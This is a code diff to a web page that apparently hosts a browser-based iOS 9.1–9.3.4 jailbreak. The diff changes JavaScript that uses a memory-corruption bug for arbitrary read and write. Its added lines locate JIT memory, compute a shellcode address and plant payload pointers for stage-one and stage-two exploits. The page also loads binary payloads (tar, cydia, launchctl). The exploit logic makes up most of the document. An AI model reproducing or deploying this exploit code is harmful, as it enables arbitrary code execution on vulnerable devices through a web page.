@@ -39,6 +39,7 @@ function load_binary_resource(url) {
   req.overrideMimeType('text\/plain; charset=x-user-defined');
   req.send(null);
   if (req.status != 200) {
+    document.write("fail downloading loader");
     stop=1;
   }
   return req.responseText;
@@ -94,8 +95,17 @@ function smashed(stale,tar_ptr,cydia_ptr,launchctl_ptr,offsets_ptr) {
 
   console.log("fcp=0x"+fcp.toString(16));
   console.log("binfile=0x"+binfile.toString(16));
-// getJIT
-console.log("Plant payload3="+offsets_ptr.toString(16));
+
+
+  // getJIT
+  r2 = smsh[(fcp+0x14)/4];
+  r3 = smsh[(r2+0x10)/4];
+  shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
+  console.log("r2=0x"+r2.toString(16));
+  console.log("r3=0x"+r3.toString(16));
+  console.log("shellcode=0x"+shellcode.toString(16));
+
+  console.log("Plant payload3="+offsets_ptr.toString(16));
   smsh[shellcode/4] = offsets_ptr;
   shellcode += 4;
 
@@ -110,7 +120,6 @@ console.log("Plant payload3="+offsets_ptr.toString(16));
   console.log("Plant payload0="+tar_ptr.toString(16));
   smsh[shellcode/4] = tar_ptr;
   shellcode += 4;
-
 
   for(var i = 0; i < filestream.length; i+=4)
   {
@@ -153,7 +162,7 @@ dgcf = function() {
 
 go = function(){
   console.log("going");
-  document.getElementById('bigButton').innerHTML = "Now";
+  document.getElementById('bigButton').innerHTML = "Running stage 1 exploit";
   setTimeout(go_, 100);
 }
 
@@ -234,7 +243,7 @@ function go_(){
   console.log("after="+stale.length);
 
   if (stale.length != 0x41414141){
-    alert("Hi Admin,you lose");
+    alert("exploit failed");
     location.reload();
     return;
   }
@@ -300,7 +309,7 @@ function go_(){
         mem2 = smsh;
         if (smsh.length != 0x10) {
 
-          document.getElementById('bigButton').innerHTML = "Done"
+          document.getElementById('bigButton').innerHTML = "Running stage 2 exploit"
           setTimeout(function () {
               smashed(stale,payload_tar_ptr,payload_cydia_ptr,payload_launchctl_ptr,payload_offsets_ptr);
             }, 100);
@@ -316,9 +325,9 @@ function go_(){
   console.log("end");
 }
 
-function go(){
+function loadRes(){
   console.log("Downloading resources");
-  document.getElementById('bigButton').innerHTML = "Running Exploiting"
+  document.getElementById('bigButton').innerHTML = "Downloading Resources"
   setTimeout(function () {
     filestream = load_binary_resource("stage1.bin")
     payload_tar = getArrFromResource(load_binary_resource("payload/tar"))
@@ -333,6 +342,7 @@ function go(){
       }, 100);
 }
 </script>
+
 <center>
 <main class="home">
      <div class="jumbotron">
@@ -343,7 +353,7 @@ function go(){
         <h2 data-aos="fade-up" data-aos-once="true" data-aos-duration="800">Support iOS 9.1 &rarr; 9.3.4</h2>
     
        
-     <div id="stuff"> <div id="bigButton" style="font-size:42px;font-family: Arial Black,Arial Bold,Gadget,sans-serif"> <a href="javascript:go()">jailbreak!</a> </div>
+     <div id="stuff"> <div id="bigButton" style="font-size:42px;font-family: Arial Black,Arial Bold,Gadget,sans-serif"> <a href="javascript:loadRes()">Jailbreak-Devices</a> </div>
        <br>
        <br>
        <div class="section">
